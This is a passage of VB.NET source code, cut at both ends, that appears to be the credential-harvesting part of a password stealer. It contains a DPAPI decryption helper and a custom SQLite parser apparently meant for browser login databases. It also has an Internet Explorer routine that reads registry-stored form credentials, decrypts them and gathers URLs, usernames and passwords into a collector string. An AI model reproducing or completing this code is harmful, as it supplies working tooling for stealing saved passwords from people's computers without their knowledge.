    Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
    Function Decrypt(ByVal Datas() As Byte) As String
        Dim inj, Ors As New DATA_BLOB
        Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
        inj.pbData = Ghandle.AddrOfPinnedObject()
        inj.cbData = Datas.Length
        Ghandle.Free()
        CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
        Dim Returned() As Byte = New Byte(Ors.cbData) {}
        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
        Dim TheString As String = Encoding.Default.GetString(Returned)
        Return TheString.Substring(0, TheString.Length - 1)
    End Function

    Private Class SQLiteHandler
        Private db_bytes() As Byte
        Private page_size As UInt16
        Private encoding As UInt64
        Private master_table_entries() As sqlite_master_entry

        Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
        Private table_entries() As table_entry
        Private field_names() As String

        Private Structure record_header_field
            Dim size As Int64
            Dim type As Int64
        End Structure

        Private Structure table_entry
            Dim row_id As Int64
            Dim content() As String
        End Structure

        Private Structure sqlite_master_entry
            Dim row_id As Int64
            Dim item_type As String
            Dim item_name As String
            Dim astable_name As String
            Dim root_num As Int64
            Dim sql_statement As String
        End Structure

        Private Function ToBigEndian16Bit(ByVal value As UInt16) As UInt16
            Return ((value And &HFF) << 8 Or (value And &HFF00) >> 8)
        End Function

        Private Function ToBigEndian32Bit(ByVal value As UInt32) As UInt32
            Return (value And &HFF) << 24 Or (value And &HFF00) << 8 Or (value And &HFF0000) >> 8 Or (value And &HFF000000) >> 24
        End Function

        Private Function ToBigEndian64Bit(ByVal value As UInt64) As UInt64
            Return (value And &HFFL) << 56 Or (value And &HFF00L) << 40 Or (value And &HFF0000L) << 24 Or (value And &HFF000000L) << 8 Or (value And &HFF00000000L) >> 8 Or (value And &HFF0000000000L) >> 24 Or (value And &HFF000000000000L) >> 40 Or (value And &HFF00000000000000L) >> 56
        End Function

        'Needs BigEndian
        'GetVariableLength
        ' returns the endindex of an variable length integer
        Function GVL(ByVal startIndex As Integer) As Integer
            If startIndex > db_bytes.Length Then Return Nothing

            For i = startIndex To startIndex + 8 Step 1
                If i > db_bytes.Length - 1 Then
                    Return Nothing
                ElseIf (db_bytes(i) And &H80) <> &H80 Then
                    Return i
                End If
            Next

            Return startIndex + 8
        End Function

        ' Eingaberichtung BigEndian
        ' ConvertVariableLength
        Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
            endIndex = endIndex + 1

            Dim retus(7) As Byte
            Dim Length = endIndex - startIndex
            Dim Bit64 As Boolean = False

            If Length = 0 Or Length > 9 Then Return Nothing
            If Length = 1 Then
                retus(0) = (db_bytes(startIndex) And &H7F)
                Return BitConverter.ToInt64(retus, 0)
            End If

            If Length = 9 Then
                ' Ein Byte wird n?mlich grad hinzugefügt
                Bit64 = True
            End If

            Dim j As Integer = 1
            Dim k As Integer = 7
            Dim y As Integer = 0

            If Bit64 Then
                retus(0) = db_bytes(endIndex - 1)
                endIndex = endIndex - 1
                y = 1
            End If

            For i As Integer = (endIndex - 1) To startIndex Step -1
                If (i - 1) >= startIndex Then
                    retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
                    j = j + 1
                    y = y + 1
                    k = k - 1
                Else
                    If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
                End If
            Next

            Return BitConverter.ToInt64(retus, 0)
        End Function

        'Checks if a number is odd
        Private Function IsOdd(ByVal value As Int64) As Boolean
            Return (value And 1) = 1
        End Function

        'Big Endian Conversation
        Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
            If Size > 8 Or Size = 0 Then Return Nothing

            Dim retVal As UInt64 = 0

            For i As Integer = 0 To Size - 1 Step 1
                retVal = ((retVal << 8) Or db_bytes(startIndex + i))
            Next

            Return retVal
        End Function

        Private Sub ReadMasterTable(ByVal Offset As UInt64)

            If db_bytes(Offset) = &HD Then 'Leaf node
                'Length for setting the array length for the entries
                Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
                Dim ol As Integer = 0

                If Not master_table_entries Is Nothing Then
                    ol = (master_table_entries.Length - 1)
                    ReDim Preserve master_table_entries((master_table_entries.Length - 1) + Length)
                Else
                    ReDim master_table_entries(Length)
                End If

                Dim ent_offset As UInt64

                For i As Integer = 0 To Length Step 1
                    ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))

                    If Offset <> 100 Then ent_offset = ent_offset + Offset

                    'Table Cell auslesen
                    Dim t = GVL(ent_offset)
                    Dim size As Int64 = CVL(ent_offset, t)

                    Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                    master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                    'Table Content
                    'Resetting the offset
                    ent_offset = ent_offset + (s - ent_offset) + 1

                    'Now get to the Record Header
                    t = GVL(ent_offset)
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length

                    Dim Field_Size(4) As Int64

                    'Now get the field sizes and fill in the Values
                    For j As Integer = 0 To 4 Step 1
                        t = s + 1
                        s = GVL(t)
                        Field_Size(j) = CVL(t, s)

                        If Field_Size(j) > 9 Then
                            If IsOdd(Field_Size(j)) Then
                                Field_Size(j) = (Field_Size(j) - 13) / 2
                            Else
                                Field_Size(j) = (Field_Size(j) - 12) / 2
                            End If
                        Else
                            Field_Size(j) = SQLDataTypeSize(Field_Size(j))
                        End If
                    Next

                    ' Wir lesen nur unbedingt notwendige Sachen aus
                    If encoding = 1 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    End If
                    If encoding = 1 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    End If
                    'master_table_entries(ol + i).astable_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1), Field_Size(2))
                    master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
                    If encoding = 1 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    End If
                Next
            ElseIf db_bytes(Offset) = &H5 Then 'internal node
                Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
                Dim ent_offset As UInt16

                For i As Integer = 0 To Length Step 1
                    ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))

                    If Offset = 100 Then
                        ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
                    Else
                        ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                    End If

                Next

                ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
            End If
        End Sub

        Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
            If db_bytes(Offset) = &HD Then 'Leaf node
                'Length for setting the array length for the entries
                Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
                Dim ol As Integer = 0

                If Not table_entries Is Nothing Then
                    ol = table_entries.Length - 1
                    ReDim Preserve table_entries((table_entries.Length - 1) + Length)
                Else
                    ReDim table_entries(Length)
                End If

                Dim ent_offset As UInt64

                For i As Integer = 0 To Length Step 1
                    ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))

                    If Not Offset = 100 Then ent_offset = ent_offset + Offset

                    'Table Cell auslesen
                    Dim t = GVL(ent_offset)
                    Dim size As Int64 = CVL(ent_offset, t)

                    Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                    table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                    'Table Content
                    'Resetting the offset
                    ent_offset = ent_offset + (s - ent_offset) + 1

                    'Now get to the Record Header
                    t = GVL(ent_offset)
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length

                    Dim Field_Size() As record_header_field
                    Dim size_read As Int64 = (ent_offset - t) + 1
                    Dim j = 0

                    'Now get the field sizes and fill in the Values
                    While size_read < Rec_Header_Size
                        ReDim Preserve Field_Size(j)

                        t = s + 1
                        s = GVL(t)
                        Field_Size(j).type = CVL(t, s)

                        If Field_Size(j).type > 9 Then
                            If IsOdd(Field_Size(j).type) Then
                                Field_Size(j).size = (Field_Size(j).type - 13) / 2
                            Else
                                Field_Size(j).size = (Field_Size(j).type - 12) / 2
                            End If
                        Else
                            Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
                        End If

                        size_read = size_read + (s - t) + 1
                        j = j + 1
                    End While

                    ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                    Dim counter As Integer = 0

                    For k As Integer = 0 To Field_Size.Length - 1 Step 1
                        If Field_Size(k).type > 9 Then
                            If Not IsOdd(Field_Size(k).type) Then
                                If encoding = 1 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                ElseIf encoding = 2 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                ElseIf encoding = 3 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                End If
                            Else
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            End If
                        Else
                            table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
                        End If

                        counter = counter + Field_Size(k).size
                    Next
                Next
            ElseIf db_bytes(Offset) = &H5 Then 'internal node
                Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
                Dim ent_offset As UInt16

                For i As Integer = 0 To Length Step 1
                    ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))

                    ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                Next

                ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
            End If

            Return True
        End Function


        Public Function ReadTable(ByVal TableName As String) As Boolean
            ' First loop through sqlite_master and look if table exists
            Dim found As Integer = -1

            For i As Integer = 0 To master_table_entries.Length Step 1
                If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next

            If found = -1 Then Return False

            Dim fields() = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(",")

            For i As Integer = 0 To fields.Length - 1 Step 1
                fields(i) = LTrim(fields(i))

                Dim index = fields(i).IndexOf(" ")

                If index > 0 Then fields(i) = fields(i).Substring(0, index)

                If fields(i).IndexOf("UNIQUE") = 0 Then
                    Exit For
                Else
                    ReDim Preserve field_names(i)
                    field_names(i) = fields(i)
                End If
            Next

            Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
        End Function

        ' Returns the row count of current table
        Public Function GetRowCount() As Integer
            Return table_entries.Length
        End Function

        ' Returns a Value from current table in row row_num with field number field
        Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
            If row_num >= table_entries.Length Then Return Nothing
            If field >= table_entries(row_num).content.Length Then Return Nothing

            Return table_entries(row_num).content(field)
        End Function

        ' Returns a Value from current table in row row_num with field name field
        Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
            Dim found As Integer = -1

            For i As Integer = 0 To field_names.Length Step 1
                If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next

            If found = -1 Then Return Nothing

            Return GetValue(row_num, found)
        End Function

        ' Returns a String-Array with all Tablenames
        Public Function GetTableNames() As String()
            Dim retVal As String()
            Dim arr = 0

            For i As Integer = 0 To master_table_entries.Length - 1 Step 1
                If master_table_entries(i).item_type = "table" Then
                    ReDim Preserve retVal(arr)
                    retVal(arr) = master_table_entries(i).item_name
                    arr = arr + 1
                End If
            Next
            Return retVal
        End Function

        ' Constructor
        Public Sub New(ByVal baseName As String)
            'Page Number n is page_size*(n-1)
            If IO.File.Exists(baseName) Then
                FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                Dim asi As String = Space(LOF(1))
                FileGet(1, asi)
                FileClose(1)

                db_bytes = System.Text.Encoding.Default.GetBytes(asi)

                If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") <> 0 Then
                    '   Throw New Exception("Not a valid SQLite 3 Database File")
                    Exit Sub
                End If

                If Not db_bytes(52) = 0 Then
                    '  Throw New Exception("Auto-vacuum capable database is not supported")
                    Exit Sub
                ElseIf ToBigEndian32Bit(BitConverter.ToInt32(db_bytes, 44)) >= 4 Then
                    '  Throw New Exception("No supported Schema layer file-format")
                    Exit Sub
                End If

                page_size = ConvertToInteger(16, 2)
                encoding = ConvertToInteger(56, 4)

                If encoding = 0 Then encoding = 1

                'Now we read the sqlite_master table
                'Offset is 100 in first page
                ReadMasterTable(100)
            End If
        End Sub
    End Class
#End Region
#Region "Internet_Explorer"
    Private Class CIE7Passwords
        Private Const ERROR_CACHE_FIND_FAIL As Integer = 0
        Private Const ERROR_CACHE_FIND_SUCCESS As Integer = 1
        Private Const MAX_PATH As Integer = 260
        Private Const MAX_CACHE_ENTRY_INFO_SIZE As Integer = 4096
        Private Const NORMAL_CACHE_ENTRY As Integer = &H1S
        Private Const URLHISTORY_CACHE_ENTRY As Integer = &H200000
        Private Structure SYSTEMTIME
            Dim wYear As Short
            Dim wMonth As Short
            Dim wDayOfWeek As Short
            Dim wDay As Short
            Dim wHour As Short
            Dim wMinute As Short
            Dim wSecond As Short
            Dim wMilliseconds As Short
        End Structure
        Private Structure INTERNET_CACHE_ENTRY_INFO
            Dim dwStructSize As Integer
            Dim lpszSourceUrlName As Integer
            Dim lpszLocalFileName As Integer
            Dim CacheEntryType As Integer
            Dim dwUseCount As Integer
            Dim dwHitRate As Integer
            Dim dwSizeLow As Integer
            Dim dwSizeHigh As Integer
            Dim LastModifiedTime As FILETIME
            Dim ExpireTime As FILETIME
            Dim LastAccessTime As FILETIME
            Dim LastSyncTime As FILETIME
            Dim lpHeaderInfo As Integer
            Dim dwHeaderInfoSize As Integer
            Dim lpszFileExtension As Integer
            Dim dwExemptDelta As Integer
        End Structure
        Private Declare Function FindFirstUrlCacheEntry Lib "wininet.dll" Alias "FindFirstUrlCacheEntryA" (ByVal lpszUrlSearchPattern As String, ByVal lpFirstCacheEntryInfo As IntPtr, ByRef lpdwFirstCacheEntryInfoBufferSize As Integer) As Integer
        Private Declare Function FindNextUrlCacheEntry Lib "wininet.dll" Alias "FindNextUrlCacheEntryA" (ByVal hEnum As Integer, ByVal lpFirstCacheEntryInfo As IntPtr, ByRef lpdwFirstCacheEntryInfoBufferSize As Integer) As Integer
        Private Declare Function FindCloseUrlCache Lib "wininet.dll" (ByVal hEnumHandle As Integer) As Integer
        Private Declare Function lstrlenA Lib "kernel32.dll" (ByVal lpString As IntPtr) As Integer
        Private Declare Function lstrcpyA Lib "kernel32.dll" (ByVal RetVal As String, ByVal ptr As Integer) As Integer
        Private Const PROV_RSA_FULL As Integer = 1
        Private Const ALG_CLASS_HASH As Integer = (4 * CLng(2 ^ 13))
        Private Const ALG_TYPE_ANY As Integer = 0
        Private Const ALG_SID_SHA As Integer = 4
        Private Const CALG_SHA As Integer = (ALG_CLASS_HASH Or ALG_TYPE_ANY Or ALG_SID_SHA)
        Private Const AT_SIGNATURE As Integer = 2
        Private Declare Function CryptAcquireContext Lib "advapi32.dll" Alias "CryptAcquireContextA" (ByRef phProv As Integer, ByVal pszContainer As Integer, ByVal pszProvider As String, ByVal dwProvType As Integer, ByVal dwFlags As Integer) As Integer
        Private Declare Function CryptCreateHash Lib "advapi32.dll" (ByVal hProv As Integer, ByVal Algid As Integer, ByVal hKey As Integer, ByVal dwFlags As Integer, ByRef phHash As Integer) As Integer
        Private Declare Function CryptHashData Lib "advapi32.dll" (ByVal hHash As Integer, ByVal pbData As IntPtr, ByVal dwDataLen As Integer, ByVal dwFlags As Integer) As Integer
        Private Const HP_HASHVAL As Integer = &H2S
        Private Declare Function CryptGetHashParam Lib "advapi32.dll" (ByVal hHash As Integer, ByVal dwParam As Integer, ByVal pByte As IntPtr, ByRef pdwDataLen As Integer, ByVal dwFlags As Integer) As Integer
        Private Declare Function CryptGetHashParam Lib "advapi32.dll" (ByVal hHash As Integer, ByVal dwParam As Integer, <MarshalAs(UnmanagedType.LPArray)> ByRef pByte() As Byte, ByRef pdwDataLen As Integer, ByVal dwFlags As Integer) As Integer
        Private Declare Function CryptSignHash Lib "advapi32.dll" Alias "CryptSignHashA" (ByVal hHash As Integer, ByVal dwKeySpec As Integer, ByVal sDescription As Integer, ByVal dwFlags As Integer, ByVal pbSignature As Integer, ByRef pdwSigLen As Integer) As Integer
        Private Declare Function CryptDestroyHash Lib "advapi32.dll" (ByVal hHash As Integer) As Integer
        Private Declare Function CryptReleaseContext Lib "advapi32.dll" (ByVal hProv As Integer, ByVal dwFlags As Integer) As Integer
        Private Const READ_CONTROL As Integer = &H20000
        Private Const STANDARD_RIGHTS_READ As Integer = (READ_CONTROL)
        Private Const KEY_QUERY_VALUE As Integer = &H1S
        Private Const KEY_ENUMERATE_SUB_KEYS As Integer = &H8S
        Private Const KEY_NOTIFY As Integer = &H10S
        Private Const SYNCHRONIZE As Integer = &H100000
        Private Const STANDARD_RIGHTS_WRITE As Integer = (READ_CONTROL)
        Private Const KEY_SET_VALUE As Integer = &H2S
        Private Const KEY_CREATE_SUB_KEY As Integer = &H4S
        Private Const KEY_READ As Integer = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))
        Private Const KEY_WRITE As Integer = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
        Private Const HKEY_CURRENT_USER As Integer = &H80000001
        Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Integer, ByVal lpSubKey As String, ByVal ulOptions As Integer, ByVal samDesired As Integer, ByRef phkResult As Integer) As Integer
        Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Integer, ByVal lpValueName As String, ByVal lpReserved As Integer, ByRef lpType As Integer, ByVal lpData As IntPtr, ByRef lpcbData As Integer) As Integer
        Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Integer, ByVal lpValueName As String) As Integer
        Private Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Integer) As Integer
        Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Integer) As Integer
        Private Structure DATA_BLOB
            Dim cbData As Integer
            Dim pbData As Integer
        End Structure
        Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByVal pOptionalEntropy As IntPtr, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
        Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
        Private Structure StringIndexHeader
            Dim dwWICK As Integer 'semble être une signature de la structure : "WICK"
            Dim dwStructSize As Integer 'taille de la structure d'entête (&h18)
            Dim dwEntriesCount As Integer 'nombre d'entrée suivant le structure
            Dim dwUnkId As Integer 'semble être un identifiant des données
            Dim dwType As Integer 'semble être le type de données :
            Dim dwUnk As Integer 'pourrait être un emplacement dans le structure pour mettre un pointeur vers la première entrée suivant cette structure
        End Structure
        Private Structure StringIndexEntry
            Dim dwDataOffset As Integer 'décalage depuis le début des données StringData
            Dim ftInsertDateTime As FILETIME 'date d'ajout de la donnée dans la liste pour le formulaire ou le champ
            Dim dwDataSize As Integer ' taille de la donnée pour le champ ou le formulaire
        End Structure
        Private Enum CRED_TYPE
            GENERIC = 1
            DOMAIN_PASSWORD
            DOMAIN_CERTIFICATE
            DOMAIN_VISIBLE_PASSWORD
            MAXIMUM
        End Enum
        Private Structure CREDENTIAL_ATTRIBUTE
            Dim lpstrKeyword As Integer
            Dim dwFlags As Integer
            Dim dwValueSize As Integer
            Dim lpbValue As Integer
        End Structure
        Private Structure CREDENTIAL
            Dim dwFlags As Integer
            Dim dwType As Integer
            Dim lpstrTargetName As Integer
            Dim lpstrComment As Integer
            Dim ftLastWritten As FILETIME
            Dim dwCredentialBlobSize As Integer
            Dim lpbCredentialBlob As Integer
            Dim dwPersist As Integer
            Dim dwAttributeCount As Integer
            Dim lpAttributes As Integer 'PCREDENTIAL_ATTRIBUTE
            Dim lpstrTargetAlias As Integer
            Dim lpUserName As Integer
        End Structure
        Private Declare Function CredEnumerate Lib "advapi32.dll" Alias "CredEnumerateW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpszFilter As String, ByVal lFlags As Integer, ByRef pCount As Integer, ByRef lppCredentials As Integer) As Integer
        Private Declare Function CredDelete Lib "advapi32.dll" Alias "CredDeleteW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpwstrTargetName As String, ByVal dwType As Integer, ByVal dwFlags As Integer) As Integer
        Private Declare Function CredFree Lib "advapi32.dll" (ByVal pBuffer As Integer) As Integer
        Private Declare Function SysAllocString Lib "oleaut32.dll" (ByVal pOlechar As Integer) As String
        Private Function GetStrFromPtrA(ByVal lpszA As IntPtr) As String
            Return Marshal.PtrToStringAnsi(lpszA)
        End Function
        Private Function CheckSum(ByRef s As String) As Byte
            Dim i As Integer
            Dim sum As Integer
            sum = 0
            For i = 1 To Len(s) Step 2
                sum = sum + CInt(Val("&H" & Mid(s, i, 2)))
            Next
            CheckSum = CByte(sum Mod 256)
        End Function
        Private Function GetSHA1Hash(ByRef pbData() As Byte) As String
            Dim buff() As Byte
            Dim i As Integer
            ReDim Preserve pbData(pbData.Length + 1)
            buff = System.Security.Cryptography.SHA1.Create().ComputeHash(pbData)
            GetSHA1Hash = ""
            For i = 0 To buff.Length - 1
                GetSHA1Hash = GetSHA1Hash & Right("00" & Hex(buff(i)), 2)
            Next
        End Function
        Private Sub ProcessIEPass(ByVal strURL As String, ByVal strHash As String, ByVal dataOut As DATA_BLOB)
            Dim k As Integer 'index
            Dim ptrData, ptrEntry As IntPtr
            Dim hIndex As StringIndexHeader
            Dim cbhIndex, cbentry As Integer
            Dim eIndex As StringIndexEntry
            Dim strUserName, strPasswd As String
            Dim ptr As IntPtr
            cbentry = Len(eIndex)
            cbhIndex = Len(hIndex)
            ptr = New IntPtr(dataOut.pbData + Marshal.ReadByte(New IntPtr(dataOut.pbData)))
            hIndex = CType(Marshal.PtrToStructure(ptr, hIndex.GetType()), StringIndexHeader)
            If hIndex.dwType = 1 Then 'passwd
                If hIndex.dwEntriesCount >= 2 Then
                    ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
                    ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
                    For i As Integer = 0 To hIndex.dwEntriesCount - 1 Step 2
                        If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
                        eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                        If lstrlenA(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                            strUserName = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                        Else 'ANSI
                            strUserName = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                        End If
                        ptrEntry = New IntPtr(ptrEntry.ToInt32 + cbentry)
                        eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                        strPasswd = Space(eIndex.dwDataSize)
                        If lstrlenA(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                            strPasswd = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                        Else 'ANSI
                            strPasswd = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                        End If
                        ptrEntry = New IntPtr(ptrEntry.ToInt32 + cbentry)
                        OL += "|URL| " & strURL & vbNewLine & "|USR| " & strUserName & vbNewLine & "|PWD| " & strPasswd & "internetexplorer" & vbNewLine

                    Next
                End If
            ElseIf hIndex.dwType = 0 Then  'champ
                strPasswd = vbNullString
                ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
                ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
                If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
                For k = 0 To hIndex.dwEntriesCount - 1
                    eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                    strUserName = Space(eIndex.dwDataSize)
                    If lstrlenA(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                        strUserName = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
                    Else 'ANSI
                        strUserName = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
                    End If
                    ptrEntry = New IntPtr(ptrEntry.ToInt32() + cbentry)
                    OL += "|URL| " & strURL & vbNewLine & "|USR| " & strUserName & vbNewLine & "|PWD| " & strPasswd & "internetexplorer" & vbNewLine

                Next
            End If
        End Sub
        Private Sub AddPasswdInfo(ByVal strRess As String, ByVal hKey As Integer)
            Dim strHash As String
            Dim dwType, ret, cbData As Integer
            Dim dataOut, dataIn, Entropy As DATA_BLOB
            strRess = LCase(strRess)
            strHash = GetSHA1Hash(System.Text.UnicodeEncoding.Unicode.GetBytes(strRess))
            strHash = strHash & Right("00" & Hex(CheckSum(strHash)), 2)
            ret = RegQueryValueEx(hKey, strHash, 0, dwType, IntPtr.Zero, cbData)
            If cbData > 0 Then
                Dim ptrData As IntPtr = Marshal.AllocHGlobal(cbData)
                ret = RegQueryValueEx(hKey, strHash, 0, dwType, ptrData, cbData)
                dataIn.cbData = cbData
                dataIn.pbData = ptrData.ToInt32
                Entropy.cbData = Len(strRess) * 2 + 2
                Entropy.pbData = Marshal.StringToHGlobalUni(strRess).ToInt32
